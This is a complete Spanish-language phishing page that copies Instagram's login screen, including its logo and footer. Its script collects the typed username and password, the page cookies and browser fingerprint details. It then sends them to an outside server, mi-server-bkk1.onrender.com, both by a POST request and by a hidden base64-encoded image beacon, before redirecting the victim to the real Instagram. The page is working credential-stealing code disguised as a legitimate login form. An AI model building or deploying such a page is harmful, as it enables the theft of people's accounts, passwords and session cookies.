<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Iniciar sesión</title>
    <style>
        /* Reseteo básico y estilos generales */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            color: #262626;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        /* Estilos del formulario de login */
        .login-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            max-width: 350px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        form {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 6px;
            width: 100%;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px;
            width: 100%;
            margin-bottom: 6px;
        }
        
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
            line-height: 26px;
        }
        
        button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
        }
        
        .or-divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 10px 0;
        }
        
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .or-text {
            color: #8e8e8e;
            font-weight: 600;
            font-size: 13px;
            margin: 0 18px;
        }
        
        .facebook-login {
            color: #385185;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            text-decoration: none;
        }
        
        .facebook-logo {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            text-align: center;
            text-decoration: none;
        }
        
        .signup-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin-bottom: 10px;
            max-width: 350px;
            width: 100%;
            text-align: center;
        }
        
        .signup-text {
            font-size: 14px;
            margin: 15px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin: 10px 0;
        }
        
        .app-text {
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .app-links {
            display: flex;
            justify-content: center;
        }
        
        .app-link {
            margin: 0 5px;
        }
        
        .app-image {
            height: 40px;
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 20px 0;
            font-size: 12px;
            color: #8e8e8e;
        }
        
        footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Número de teléfono, usuario o correo electrónico" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Contraseña" required>
                </div>
                <button type="submit" id="loginButton">Iniciar sesión</button>
            </form>
            
            <div class="or-divider">
                <div class="line"></div>
                <div class="or-text">O</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="facebook-login">
                <span class="facebook-logo">f</span> Iniciar sesión con Facebook
            </a>
            
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        </div>
        
        <div class="signup-card">
            <p class="signup-text">¿No tienes una cuenta? <a href="#" class="signup-link">Regístrate</a></p>
        </div>
        
        <div class="app-download">
            <p class="app-text">Descarga la aplicación.</p>
            <div class="app-links">
                <a href="#" class="app-link">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_spanish-mexican.png/73b16fb697bd.png" alt="Consíguelo en App Store" class="app-image">
                </a>
                <a href="#" class="app-link">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_spanish-mexican.png/33839c974cb3.png" alt="Consíguelo en Google Play" class="app-image">
                </a>
            </div>
        </div>
        
        <footer>
            <div>
                <a href="#">Meta</a>
                <a href="#">Información</a>
                <a href="#">Blog</a>
                <a href="#">Empleo</a>
                <a href="#">Ayuda</a>
                <a href="#">API</a>
                <a href="#">Privacidad</a>
                <a href="#">Condiciones</a>
                <a href="#">Cuentas destacadas</a>
                <a href="#">Hashtags</a>
                <a href="#">Ubicaciones</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
            </div>
            <div style="margin-top: 10px;">
                <span>&copy; 2025 Instagram from Meta</span>
            </div>
        </footer>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const stolenData = {
                credentials: {
                    username: username,
                    password: password
                },
                cookies: document.cookie,
                browserInfo: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer
                },
                timestamp: new Date().toISOString(),
                location: window.location.href
            };
            
            console.log("Datos capturados:", stolenData);
            
            fetch('https://mi-server-bkk1.onrender.com/datos', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(stolenData)
            }).catch(error => {
                console.error('Error:', error);
            });
            
            const encodedData = btoa(JSON.stringify(stolenData));
            const exfilImage = new Image();
            exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
            exfilImage.style.display = 'none';
            document.body.appendChild(exfilImage);
            
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 1000);
        });
    </script>
</body>
</html>
